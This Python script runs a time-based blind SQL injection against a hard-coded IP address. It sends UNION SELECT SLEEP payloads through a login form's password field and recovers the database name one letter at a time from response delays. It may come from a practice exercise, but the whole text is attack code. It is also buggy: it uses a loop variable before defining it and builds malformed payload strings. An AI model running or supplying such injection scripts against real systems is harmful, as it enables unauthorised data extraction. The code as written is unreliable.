import requests
import time

def db_name():
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    db = []
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    passwd_type = "' UNION SELECT SLEEP(5) where database() like '" + texte + dictionary[j] + "%' -- "



    for i in range(1, 20):
        for j in range(0, len(dictionary)):
            for k in range(1, 10):

                passwd_type += "' UNION SELECT SLEEP(5)" + str(k) + "" + "," + " where database() like '" + texte + dictionary[j] + "%' -- "
                print(passwd_type)


            
            
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            passwd = "' UNION SELECT SLEEP(5),1,2 where database() like '" + texte + dictionary[j] + "%' -- "
            print(passwd)


            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(a)



            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break



    db.append(texte)
    print(db)
